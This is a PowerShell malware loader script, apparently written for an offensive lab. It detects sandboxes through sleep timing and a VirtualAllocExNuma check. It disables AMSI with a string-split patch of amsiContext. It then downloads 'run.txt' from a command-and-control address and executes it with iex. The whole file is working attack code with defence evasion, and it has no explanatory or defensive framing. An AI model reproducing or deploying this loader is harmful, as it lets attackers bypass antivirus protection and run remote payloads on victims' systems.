# run_txt_launcher.ps1
# Bootstrap executed inside the InstallUtil DLL's runspace (or from -enc).
# Handles AV evasion, then downloads and runs run.txt from the C2.
#
# Encoded via tools/encode_poller.py into shared/bypass_dll.cs (B64).

$ErrorActionPreference = 'SilentlyContinue'

# --- 1. Emulator detection ---
$t1 = Get-Date
Start-Sleep -Seconds 2
$t2 = Get-Date
if (($t2 - $t1).TotalSeconds -lt 1.5) { exit }

# --- 2. Non-emulated API check ---
$numaSig = @"
using System;
using System.Runtime.InteropServices;
public class N {
    [DllImport("kernel32.dll", SetLastError=true, ExactSpelling=true)]
    public static extern IntPtr VirtualAllocExNuma(IntPtr h, IntPtr a,
        uint s, uint t, uint p, uint n);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();
}
"@
try { Add-Type -TypeDefinition $numaSig -ErrorAction Stop } catch { }
if ([N]::VirtualAllocExNuma([N]::GetCurrentProcess(),
        [IntPtr]::Zero, 0x1000, 0x3000, 0x04, 0) -eq [IntPtr]::Zero) { exit }

# --- 3. AMSI bypass, string-split ---
$a = iex "[Ref].Asse" + "mbly.GetTy" + "pes()"
ForEach ($b in $a) { if ($b.Name -like "*iU" + "tils") { $c = $b } }
$d = $c.GetFields('NonP' + 'ublic,Static')
ForEach ($e in $d) { if ($e.Name -like "*Cont" + "ext") { $f = $e } }
$g = $f.GetValue($null)
[IntPtr]$ptr = $g
[Int32[]]$buf = @(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

# --- 4. Pull and execute run.txt ---
$runner = (New-Object System.Net.WebClient).DownloadString(
    'http://192.168.119.120/run.txt'
)
iex $runner
